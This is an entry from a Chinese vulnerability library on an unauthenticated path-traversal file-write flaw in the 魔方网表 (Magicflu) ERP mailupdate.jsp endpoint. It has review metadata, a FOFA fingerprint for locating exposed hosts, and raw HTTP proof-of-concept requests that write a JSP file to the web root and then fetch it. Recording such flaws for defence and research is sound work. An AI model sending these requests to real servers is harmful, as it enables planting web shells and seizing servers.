---
source: "wy876 漏洞文库"
title: "魔方网表ERP mailupdate messageid路径遍历任意文件写入"
product: "魔方网表ERP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，JSP执行及可写目录"
prerequisites: "未经认证声称"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lb3k53eifkairogb"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%AD%94%E6%96%B9%E7%BD%91%E8%A1%A8/%E9%AD%94%E6%96%B9%E7%BD%91%E8%A1%A8mailupdate%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "icon_hash=\"694014318\""
fofa_unverified: "<font style="
id: "vw-3b3285d704c57ba463f4ecd4"
entity_id: "ve-3b3285d704c57ba463f4ecd4"
schema_version: "1"
---

# 魔方网表ERP mailupdate messageid路径遍历任意文件写入

## 条目说明

- 对象与具体问题：魔方网表ERP；mailupdate messageid路径遍历任意文件写入
- 版本、配置及部署条件：版本未知，JSP执行及可写目录
- 认证与权限前提：未经认证声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- GET参数messageid与messagecontent直接写文件应更精确归路径遍历文件写入，而非multipart上传
- JSP输出标记没有实际返回支持RCE；测试持久写文件未说明清理
- ERP分类可统一，缺版本/补丁

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
魔方网表是一款基于web浏览器的通用信息管理软件，魔方网表ERP 存在任意文件上传漏洞，未经身份验证的攻击者可以利用此漏洞上传恶意后门文件 ，控制服务器权限

## 二、影响版本
+ 魔方网表

## 三、资产测绘
+ fofa`icon_hash="694014318"`
+ 特征


## 四、漏洞复现
```http
GET /magicflu/html/mail/mailupdate.jsp?messageid=/../../../test1.jsp&messagecontent=%3C%25+out.println%28%22tteesstt1%22%29%3B%25%3E HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 
```


文件上传位置

```http
GET /magicflu/test1.jsp HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lb3k53eifkairogb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
